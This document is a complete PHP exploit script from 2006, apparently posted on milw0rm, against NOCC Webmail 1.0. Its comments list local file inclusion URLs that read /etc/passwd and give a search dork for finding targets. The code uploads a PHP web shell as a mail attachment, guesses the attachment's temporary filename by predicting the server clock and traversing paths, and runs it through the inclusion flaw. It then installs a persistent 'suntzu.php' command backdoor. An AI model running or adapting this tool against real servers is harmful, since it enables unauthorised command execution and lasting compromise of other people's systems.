<html><head><title>NOCC Webmail <= 1.0 (Local Inclusion) Remote Code Execution Exploit</title></head><pre>&lt;?php
#  ---noccw_10_incl_xpl.php                                 8.22 23/02/2006    #
#                                                                              #
#  NOCC Webmail &lt;= 1.0 remote commands execution exploit through arbitrary     #
#  local inclusion &amp; attachment filename prediction                            #
#                                                                              #
#                              coded by rgod                                   #
#                     site: http://retrogod.altervista.org                     #
#                                                                              #
# -&gt; works regardless of any magic_quotes_gpc settings                         #
#                                                                              #
# dork: (&quot;powered by nocc&quot; intitle:&quot;NOCC Webmail&quot;) -site:sourceforge.net       #
# -Zoekinalles.nl -analysis                                                    #
#                                                                              #
# Sun-Tzu: &quot;Knowing the place and the time of the coming  battle, we may       #
# concentrate from the greatest distances in order to fight&quot;                   #

/* short explaination:
   we have various arbitrary local inclusion issues, ex:

   http://[tArGeT]/[pAtH]/index.php?lang=../../../../../../../../../../../../etc/passwd%00
   http://[tArGeT]/[pAtH]/index.php?theme=../../../../../../../../../../../etc/passwd%00
   http://[tArGeT]/[pAtH]/html/footer.php?_SESSION[nocc_theme]=../../../../../../../../etc/passwd%00

   This code upload an evil mail attachment (file is renamed by NOCC...).
   After, it tries to include it, predicting its name and its location, ex:

   http://[tArGeT]/[pAtH]/index.php?lang=../tmp/php354.tmp1140521343.att%00&amp;cmd=ls%20-la
   http://[tArGeT]/[pAtH]/index.php?theme=../tmp/php354.tmp1140521343.att%00&amp;cmd=ls%20-la
   http://[tArGeT]/[pAtH]/html/footer.php?_SESSION[nocc_theme]=..%2f..%2Ftmp%2Fphp53.tmp1140662880.att%00

   If succeeded, it installs  a backdoor called suntzu.php on target server.

   To launch this exploit you need a POP3 account on a machine of your choice,
   you need to supply servername, username &amp; password.

   a note:
   you can do the same manually and more quickly with profile files, if
   enabled, ex:
   edit your profile, then:

   http://[target]/[path]/index.php?cmd=cat%20conf.php&amp;lang=../profiles/username@somehost.com.pref%00

   see the full advisory here: http://retrogod.altervista.org/noccw_10_incl_xpl.html
                                                                              */
error_reporting(0);
ini_set(&quot;max_execution_time&quot;,0);
ini_set(&quot;default_socket_timeout&quot;,10);
ob_implicit_flush (1);

echo'&lt;html&gt;&lt;head&gt;&lt;title&gt; **** NOCC Webmail &lt;= 1.0 remote commands execution ****
&lt;/title&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=iso-8859-1&quot;&gt;
&lt;style type=&quot;text/css&quot;&gt; body {background-color:#111111;   SCROLLBAR-ARROW-COLOR:
#ffffff; SCROLLBAR-BASE-COLOR: black; CURSOR: crosshair; color:  #1CB081; }  img
{background-color:   #FFFFFF   !important}  input  {background-color:    #303030
!important} option {  background-color:   #303030   !important}         textarea
{background-color: #303030 !important} input {color: #1CB081 !important}  option
{color: #1CB081 !important} textarea {color: #1CB081 !important}        checkbox
{background-color: #303030 !important} select {font-weight: normal;       color:
#1CB081;  background-color:  #303030;}  body  {font-size:  8pt       !important;
background-color:   #111111;   body * {font-size: 8pt !important} h1 {font-size:
0.8em !important}   h2   {font-size:   0.8em    !important} h3 {font-size: 0.8em
!important} h4,h5,h6    {font-size: 0.8em !important}  h1 font {font-size: 0.8em
!important} 	h2 font {font-size: 0.8em !important}h3   font {font-size: 0.8em
!important} h4 font,h5 font,h6 font {font-size: 0.8em !important} * {font-style:
normal !important} *{text-decoration: none !important} a:link,a:active,a:visited
{ text-decoration: none ; color : #99aa33; } a:hover{text-decoration: underline;
color : #999933; } .Stile5 {font-family: Verdana, Arial, Helvetica,  sans-serif;
font-size: 10px; } .Stile6 {font-family: Verdana, Arial, Helvetica,  sans-serif;
font-weight:bold; font-style: italic;}--&gt;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;p class=&quot;Stile6&quot;&gt;
 **** NOCC Webmail &lt;= 1.0 remote commands execution ****&lt;/p&gt;&lt;p class=&quot;Stile6&quot;&gt;a
script  by  rgod  at    &lt;a href=&quot;http://retrogod.altervista.org&quot;target=&quot;_blank&quot;&gt;
http://retrogod.altervista.org&lt;/a&gt; &lt;/p&gt; &lt;table  width=&quot;84%&quot;&gt;&lt;tr&gt;&lt;td width=&quot;43%&quot;&gt;
&lt;form name=&quot;form1&quot; method=&quot;post&quot; action=&quot;'.$_SERVER[PHP_SELF].'&quot;&gt;    &lt;p&gt;&lt;input
type=&quot;text&quot;  name=&quot;hOsT&quot;&gt; &lt;span class=&quot;Stile5&quot;&gt;* tArGeT    (ex:www.sitename.com)
&lt;/span&gt;&lt;/p&gt; &lt;p&gt;&lt;input type=&quot;text&quot; name=&quot;pAtH&quot;&gt;  &lt;span class=&quot;Stile5&quot;&gt;* pAtH (ex:
/nocc/ or just / )  &lt;/span&gt; &lt;/p&gt; &lt;p&gt; &lt;input type=&quot;text&quot;  name=&quot;cmd&quot;&gt;       &lt;span
class=&quot;Stile5&quot;&gt; * specify a command   &lt;/span&gt; &lt;/p&gt;  &lt;p&gt;      &lt;input  type=&quot;text&quot;
name=&quot;POP3_SERVER&quot;&gt;&lt;span class=&quot;Stile5&quot;&gt; * a POP3 server  &lt;/span&gt; &lt;/p&gt; &lt;p&gt;&lt;input
type=&quot;text&quot; name=&quot;USER&quot;&gt;&lt;span class=&quot;Stile5&quot;&gt; * USERNAME ...&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;input
type=&quot;password&quot;   name=&quot;PASSWD&quot;&gt; &lt;span  class=&quot;Stile5&quot;&gt; * ... and PASSWORD to it
&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;input type=&quot;text&quot; name=&quot;PorT&quot;&gt;&lt;span class=&quot;Stile5&quot;&gt;specify a PorT
other than  80 (default value)&lt;/span&gt; &lt;/p&gt; &lt;p&gt; &lt;input  type=&quot;text&quot; name=&quot;pRoXy&quot;&gt;
&lt;span class=&quot;Stile5&quot;&gt; send  exploit through an HTTP pRoXy (ip:PorT) &lt;/span&gt; &lt;/p&gt;
&lt;p&gt;&lt;input type=&quot;submit&quot; name=&quot;Submit&quot; value=&quot;go!&quot;&gt;&lt;/p&gt;&lt;/form&gt;&lt;/td&gt;&lt;/tr&gt; &lt;/table&gt;
&lt;/body&gt;&lt;/html&gt;';

function show($headeri)
{
  $ii=0;$ji=0;$ki=0;$ci=0;
  echo '&lt;table border=&quot;0&quot;&gt;&lt;tr&gt;';
  while ($ii &lt;= strlen($headeri)-1){
    $dAtAi=dechex(ord($headeri[$ii]));
    if ($ji==16) {
      $ji=0;
      $ci++;
      echo &quot;&lt;td&gt;&amp;nbsp;&amp;nbsp;&lt;/td&gt;&quot;;
      for ($li=0; $li&lt;=15; $li++) {
        echo &quot;&lt;td&gt;&quot;.htmlentities($headeri[$li+$ki]).&quot;&lt;/td&gt;&quot;;
		}
      $ki=$ki+16;
      echo &quot;&lt;/tr&gt;&lt;tr&gt;&quot;;
    }
    if (strlen($dAtAi)==1) {
      echo &quot;&lt;td&gt;0&quot;.htmlentities($dAtAi).&quot;&lt;/td&gt;&quot;;
    }
    else {
      echo &quot;&lt;td&gt;&quot;.htmlentities($dAtAi).&quot;&lt;/td&gt; &quot;;
    }
    $ii++;$ji++;
  }
  for ($li=1; $li&lt;=(16 - (strlen($headeri) % 16)+1); $li++) {
    echo &quot;&lt;td&gt;&amp;nbsp&amp;nbsp&lt;/td&gt;&quot;;
  }
  for ($li=$ci*16; $li&lt;=strlen($headeri); $li++) {
    echo &quot;&lt;td&gt;&quot;.htmlentities($headeri[$li]).&quot;&lt;/td&gt;&quot;;
  }
  echo &quot;&lt;/tr&gt;&lt;/table&gt;&quot;;
}

$pRoXy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';

function sendpAcKeT() //2x speed
{
  global $pRoXy, $hOsT, $PorT, $pAcKeT, $HtMl, $pRoXy_regex;
  $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
  if ($socket &lt; 0) {
    echo &quot;socket_create() failed: reason: &quot; . socket_strerror($socket) . &quot;&lt;br&gt;&quot;;
  }
  else {
    $c = preg_match($pRoXy_regex,$pRoXy);
    if (!$c) {echo 'Not a valid proxy...';
    die;
    }
  echo &quot;OK.&lt;br&gt;&quot;;
  echo &quot;Attempting to connect to &quot;.$hOsT.&quot; on PorT &quot;.$PorT.&quot;...&lt;br&gt;&quot;;
  if ($pRoXy=='') {
    $result = socket_connect($socket, $hOsT, $PorT);
  }
  else {
    $parts =explode(':',$pRoXy);
    echo 'Connecting to '.$parts[0].':'.$parts[1].' pRoXy...&lt;br&gt;';
    $result = socket_connect($socket, $parts[0],$parts[1]);
  }
  if ($result &lt; 0) {
    echo &quot;socket_connect() failed.\r\nReason: (&quot;.$result.&quot;) &quot; . socket_strerror($result) . &quot;&lt;br&gt;&lt;br&gt;&quot;;
  }
  else {
    echo &quot;OK.&lt;br&gt;&lt;br&gt;&quot;;
    $HtMl= '';
    socket_write($socket, $pAcKeT, strlen($pAcKeT));
    echo &quot;Reading response:&lt;br&gt;&quot;;
    while ($out= socket_read($socket, 2048)) {$HtMl.=$out;}
    echo nl2br(htmlentities($HtMl));
    echo &quot;Closing socket...&quot;;
    socket_close($socket);
  }
  }
}

function sendpAcKeTii($pAcKeT)
{
  global $pRoXy, $hOsT, $PorT, $HtMl, $pRoXy_regex;
  if ($pRoXy=='') {
    $ock=fsockopen(gethOsTbyname($hOsT),$PorT);
    if (!$ock) {
      echo 'No response from '.htmlentities($hOsT); die;
    }
  }
  else {
	$c = preg_match($pRoXy_regex,$pRoXy);
    if (!$c) {
      echo 'Not a valid pRoXy...';die;
    }
    $parts=explode(':',$pRoXy);
    echo 'Connecting to '.$parts[0].':'.$parts[1].' pRoXy...&lt;br&gt;';
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from pRoXy...';die;
	}
  }
  fputs($ock,$pAcKeT);
  if ($pRoXy=='') {
    $HtMl='';
    while (!feof($ock)) {
      $HtMl.=fgets($ock);
    }
  }
  else {
    $HtMl='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$HtMl))) {
      $HtMl.=fread($ock,1);
    }
  }
  fclose($ock);
  // echo nl2br(htmlentities($HtMl));
}

function greenwich_timestamp($HtMl)
{
   $temp=explode(&quot;Date: &quot;,$HtMl);
   $temp2=explode(&quot;\r\n&quot;,$temp[1]);
   $is_now=$temp2[0];
   $temp=explode(&quot; &quot;,$is_now);$day=$temp[1];$month=$temp[2];$year=$temp[3];$temp2=explode(&quot;:&quot;,$temp[4]);
   $hour=$temp2[0];$min=$temp2[1];$sec=$temp2[2];
   $tb=array ('Jan', '1','Feb', '2','Mar', '3','Apr', '4','May', '5','Jun', '6',
   'Jul', '7','Aug', '8','Sep', '9','Oct', '10','Nov', '11','Dec', '12');
   for ($i=0;$i&lt;=23;$i++) {if ($month==$tb[$i]) {$month=$tb[$i+1];break;}}
   return mktime($hour,$min,$sec,$month,$day,$year);
}

if ( get_magic_quotes_gpc() ) {
   function stripslashes_deep($value) {
       $value = is_array($value) ? array_map('stripslashes_deep', $value) : stripslashes($value);
       return $value;
   }
   $_POST = stripslashes_deep($_POST);
}

$hOsT=$_POST[hOsT];$pAtH=$_POST[pAtH];$PorT=$_POST[PorT];
$USER=$_POST[USER];$PASSWD=$_POST[PASSWD];$POP3_SERVER=$_POST[POP3_SERVER];
$cmd=$_POST[cmd];
echo &quot;&lt;span class=\&quot;Stile5\&quot;&gt;&quot;;
if (($hOsT&lt;&gt;'') and ($pAtH&lt;&gt;'') and ($cmd&lt;&gt;''))
{
  $PorT=intval(trim($PorT));
  if ($PorT=='') {$PorT=80;}
  if (($pAtH[0]&lt;&gt;'/') or ($pAtH[strlen($pAtH)-1]&lt;&gt;'/')) {echo 'Error... check the pAtH!'; die;}
  if ($pRoXy=='') {$p=$pAtH;} else {$p='http://'.$hOsT.':'.$PorT.$pAtH;}
  $hOsT=str_replace(&quot;\r&quot;,&quot;&quot;,$hOsT);$hOsT=str_replace(&quot;\n&quot;,&quot;&quot;,$hOsT);
  $pAtH=str_replace(&quot;\r&quot;,&quot;&quot;,$pAtH);$pAtH=str_replace(&quot;\n&quot;,&quot;&quot;,$pAtH);

#STEP 0 -&gt; Check if already succeeded on tArGeT hOsT...
$subpAtH= array ('','html/');
for ($i=0; $i&lt;=count($subpAtH)-1; $i++)
{
  $pAcKeT =&quot;GET &quot;.$p.$subpAtH[$i].&quot;suntzu.php?cmd=&quot;.urlencode($cmd).&quot; HTTP/1.1\r\n&quot;;
  $pAcKeT.=&quot;Host: &quot;.$hOsT.&quot;\r\n&quot;;
  $pAcKeT.=&quot;Connection: Close\r\n\r\n&quot;;
  show($pAcKeT);
  sendpAcKeTii($pAcKeT);
  if (eregi(&quot;Hi Master!&quot;,$HtMl)) {echo nl2br(htmlentities($HtMl));
                                  die(&quot;Exploit succeeded...&quot;);}
}
if (file_exists($hOsT.&quot;.txt&quot;))
  {
   $f=fopen($hOsT.&quot;.txt&quot;,&quot;r&quot;);
   $XpL=fgets($f);
   fclose($f);
   $pAcKeT =&quot;GET &quot;.$p.$XpL.&quot;&amp;cmd=&quot;.urlencode($cmd).&quot; HTTP/1.1\r\n&quot;;
   $pAcKeT.=&quot;hOsT: &quot;.$hOsT.&quot;\r\n&quot;;
   $pAcKeT.=&quot;Connection: Close\r\n\r\n&quot;;
   show($pAcKeT);
   sendpAcKeTii($pAcKeT);
   if (eregi(&quot;Hi Master!&quot;,$HtMl)) {echo nl2br(htmlentities($HtMl));
                                   die(&quot;Exploit succeeded...&quot;);}
}
}

if (($hOsT&lt;&gt;'') and ($pAtH&lt;&gt;'') and ($cmd&lt;&gt;'') and ($POP3_SERVER&lt;&gt;'') and ($USER&lt;&gt;'') and ($PASSWD&lt;&gt;''))
{
$difftime=0;
//syncrhonize with remote tArGeT Unin epoch time by Apache &quot;Date:&quot; response header
//it carries GMT time... sending two HEAD requests, one to target, one to yourself
if (eregi(&quot;Date: &quot;,$HtMl))
{
        $pAcKeT =&quot;HEAD / HTTP/1.1\r\nhOsT: &quot;.$hOsT.&quot;\r\nConnection: Close\r\n\r\n&quot;;
        sendpAcKeTii($pAcKeT);
        $itstime=greenwich_timestamp($HtMl);
        echo &quot;tArGeT hOsT greenwich timestamp: &quot;.$itstime.&quot;&lt;br&gt;&quot;;
        $pAcKeT=str_replace($hOsT,$_SERVER[SERVER_NAME],$pAcKeT);
        $fp=fsockopen($_SERVER[SERVER_NAME],$_SERVER[SERVER_PORT]);
        fputs($fp,$pAcKeT);$out='';
        while (!feof($fp)){
          $out.=fgets($fp);
        }
        fclose($fp);
        $mytime=greenwich_timestamp($out);
        echo &quot;my greenwich timestamp: &quot;.$mytime.&quot;&lt;br&gt;&quot;;
        $difftime= $itstime-$mytime;
        echo &quot;difftime: &quot;.$difftime.&quot;&lt;br&gt;&quot;;
}
  #STEP 1 -&gt; Login to a POP3 server that you choose to have access on NOCC interface
  $dAtA =&quot;user=&quot;.$USER;
  $dAtA.=&quot;&amp;domainnum=0&quot;;
  $dAtA.=&quot;&amp;passwd=&quot;.$PASSWD;
  $dAtA.=&quot;&amp;server=&quot;.$POP3_SERVER;
  $dAtA.=&quot;&amp;port=110&quot;;
  $dAtA.=&quot;&amp;servtype=pop3&quot;;
  $dAtA.=&quot;&amp;lang=en&quot;;
  $dAtA.=&quot;&amp;theme=standard&quot;;
  $dAtA.=&quot;&amp;enter=Ok&quot;;
  $pAcKeT =&quot;POST &quot;.$p.&quot;action.php HTTP/1.1\r\n&quot;;
  $pAcKeT.=&quot;Referer: http://&quot;.$hOsT.$pAtH.&quot;\r\n&quot;;
  $pAcKeT.=&quot;Accept-Language: en\r\n&quot;;
  $pAcKeT.=&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
  $pAcKeT.=&quot;User-Agent: Sun-Tzu\r\n&quot;;
  $pAcKeT.=&quot;Host: &quot;.$hOsT.&quot;\r\n&quot;;
  $pAcKeT.=&quot;Content-Length: &quot;.strlen($dAtA).&quot;\r\n&quot;;
  $pAcKeT.=&quot;Connection: Close\r\n&quot;;
  $pAcKeT.=&quot;Cache-Control: no-cache\r\n\r\n&quot;;
  $pAcKeT.=$dAtA;
  show($pAcKeT);
  sendpAcKeTii($pAcKeT);
  $temp=explode(&quot;Set-Cookie: &quot;,$HtMl);
  $temp2=explode(&quot; &quot;,$temp[1]);
  $COOKIE=$temp2[0];
  $temp2=explode(&quot; &quot;,$temp[2]);
  $COOKIE.=&quot; &quot;.$temp2[0];
  echo &quot;COOKIE -&gt; &quot;.htmlentities($COOKIE).&quot;&lt;BR&gt;&quot;;

#STEP 2 -&gt; Upload the evil attachment...
$action = array ('add', 'Attach'); //'action' name is different in some versions
$found=0;
for ($d=0; $d=count($action)-1; $d++)
{
$dAtA='-----------------------------7d630bc80618
Content-Disposition: form-data; name=&quot;sort&quot;

1
-----------------------------7d630bc80618
Content-Disposition: form-data; name=&quot;sortdir&quot;

1
-----------------------------7d630bc80618
Content-Disposition: form-data; name=&quot;lang&quot;

en
-----------------------------7d630bc80618
Content-Disposition: form-data; name=&quot;action&quot;

write
-----------------------------7d630bc80618
Content-Disposition: form-data; name=&quot;sendaction&quot;

'.$action[$d].'
-----------------------------7d630bc80618
Content-Disposition: form-data; name=&quot;num_attach&quot;

0
-----------------------------7d630bc80618
Content-Disposition: form-data; name=&quot;mail_from&quot;

fake@fakemail.com
-----------------------------7d630bc80618
Content-Disposition: form-data; name=&quot;mail_to&quot;


-----------------------------7d630bc80618
Content-Disposition: form-data; name=&quot;mail_cc&quot;


-----------------------------7d630bc80618
Content-Disposition: form-data; name=&quot;mail_bcc&quot;


-----------------------------7d630bc80618
Content-Disposition: form-data; name=&quot;mail_subject&quot;


-----------------------------7d630bc80618
Content-Disposition: form-data; name=&quot;mail_att&quot;; filename=&quot;C:\suntzuuuu.php&quot;
Content-Type: text/html

&lt;?php
ob_clean();echo&quot;Hi Master!&quot;;ini_set(&quot;max_execution_time&quot;,0);passthru($_GET[cmd]);
$sun=fopen(&quot;suntzu.php&quot;,&quot;w&quot;);fputs($sun,&quot;&lt;?php ob_clean();echo\&quot;Hi Master!\&quot;;ini_set(\&quot;max_execution_time\&quot;,0);passthru(\$_GET[cmd]);&quot;);
fclose($sun);chmod(&quot;suntzu.php&quot;,777);
die;
?&gt;
-----------------------------7d630bc80618
Content-Disposition: form-data; name=&quot;priority&quot;

3 (Normal)
-----------------------------7d630bc80618
Content-Disposition: form-data; name=&quot;mail_body&quot;


-----------------------------7d630bc80618--';

  $pAcKeT =&quot;POST &quot;.$p.&quot;send.php HTTP/1.1\r\n&quot;;
  $pAcKeT.=&quot;Referer: http://&quot;.$hOsT.$pAtH.&quot;action.php?action=write&amp;lang=en&amp;sort=1&amp;sortdir=1\r\n&quot;;
  $pAcKeT.=&quot;Accept-Language: en\r\n&quot;;
  $pAcKeT.=&quot;Content-Type: multipart/form-data; boundary=---------------------------7d630bc80618\r\n&quot;;
  $pAcKeT.=&quot;User-Agent: Sun-Tzu\r\n&quot;;
  $pAcKeT.=&quot;Host: &quot;.$hOsT.&quot;\r\n&quot;;
  $pAcKeT.=&quot;Content-Length: &quot;.strlen($dAtA).&quot;\r\n&quot;;
  $pAcKeT.=&quot;Connection: Close\r\n&quot;;
  $pAcKeT.=&quot;Cache-Control: no-cache\r\n&quot;;
  $pAcKeT.=&quot;Cookie: &quot;.$COOKIE.&quot;\r\n\r\n&quot;;
  $pAcKeT.=$dAtA;
  show($pAcKeT);
  $mytime=time()+$difftime;

  echo &quot;predicting Unix epoch time on remote machine -&gt;&quot;.$mytime.&quot;&lt;br&gt;&lt;br&gt;&quot;;
  sendpAcKeTii($pAcKeT);

  if (eregi(&quot;suntzuuuu.php&quot;,$HtMl)) {$found=1; break;}
}
if ($found==0)
{die(&quot;Failed to upload the attachment, maybe wrong pop3 details&quot;);}

# STEP 3 Our routine... cycling to find the evil attachment and to launch commands...
# ---------------------------------START----------------------------------------
  //guessing where $tmpdir can be..., add some values here if you want
  $tempdir= array (
                  'tmp/',
                  '../../../../../../../../../../../../../tmp/',
		          '../../../../../../../../../../../../../temp/',
                  '',
		          'temp/',
		          '../tmp/',
		          '../../tmp/',
		          '../../../tmp/',
		          '../../../../tmp/',
		          '../../../../../tmp/',
		          '../../../../../../tmp/',
		          '../../../../../../../tmp/'
		          );
  //predicting time() substring in attachment filename
  $predict_time=
            array (
	          $mytime,
	          $mytime + 1,
	          $mytime + 2,
	          $mytime + 3
	          );

function refresh()
{
  flush();
  ob_flush();
  usleep(10000);
}
$script= array (
                &quot;index.php?lang=&quot;,
                &quot;index.php?theme=&quot;,
                &quot;html/footer.php?_SESSION[nocc_theme]=..%2F&quot;
               );

for ($y=1; $y&lt;=65535; $y++) //some hex values in php temporary files
{
  $a_value=strtoupper(dechex($y));
  for ($x=0; $x&lt;=count($tempdir)-1; $x++) //for each possible file location
  {
    for ($z=0; $z&lt;=count($predict_time) - 1; $z++) // for actual Unix epoch time, with +1,+2,+3
    {
      for($ww=0; $ww&lt;=count($script)-1; $ww++) //for each vulnerable script
      {
      $XpL=&quot;../&quot;.$tempdir[$x].&quot;php&quot;.$a_value.&quot;.tmp&quot;.$predict_time[$z].&quot;.att&quot;.chr(0x00);
      $XpL=urlencode($XpL);
      $XpL=$script[$ww].$XpL;
      $pAcKeT =&quot;GET &quot;.$p.$XpL.&quot;&amp;cmd=&quot;.urlencode($cmd).&quot; HTTP/1.1\r\n&quot;;
      $pAcKeT.=&quot;Host: &quot;.$hOsT.&quot;\r\n&quot;;
      $pAcKeT.=&quot;Connection: Close\r\n\r\n&quot;;
      echo &quot;trying with http://&quot;.$hOsT.$pAtH.$XpL.&quot;&lt;br&gt;&quot;; refresh();
      //show($pAcKeT);
      sendpAcKeTii($pAcKeT);
      if (eregi(&quot;Hi Master!&quot;,$HtMl))
               { show($pAcKeT);
                 echo nl2br(htmlentities($HtMl));
		 $f=fopen($hOsT.&quot;.txt&quot;,&quot;w&quot;);
		 fputs($f,$XpL);
		 fclose($f);
		 refresh();
         die(&quot;Exploit succeded... We tried to put a backdoor on tArGeT system, ************ &lt;br&gt;
		      call this url:                                                                &lt;br&gt;
		      http://&quot;.htmlentities($hOsT.$pAtH).&quot;suntzu.php?&amp;cmd=[your command]            &lt;br&gt;
		      or this:                                                                      &lt;br&gt;
		      http://&quot;.htmlentities($hOsT.$pAtH).&quot;html/suntzu.php?&amp;cmd=[your command]       &lt;br&gt;
		      however,if not succeeded, you can launch commands with this:                  &lt;br&gt;
		      http://&quot;.htmlentities($hOsT.$pAtH.$XpL).&quot;&amp;cmd=[your command]                  &lt;br&gt;
		      Also, we keep exploit url in &quot;.htmlentities($hOsT).&quot;.txt, so you have not to  &lt;br&gt;
		      cycle anymore...                                                              &lt;br&gt;
		      Enjoy! ***********************************************************************&lt;br&gt;
		     &quot;);
              }
	  }
    }
  }
}
//If you are here...
echo &quot;Exploit failed...&quot;;
#-------------------------------END---------------------------------------------
}
else
{echo &quot;Fill * required fields, optionally specify a pRoXy...&quot;;}
?&gt;

# milw0rm.com [2006-02-23]</pre></html>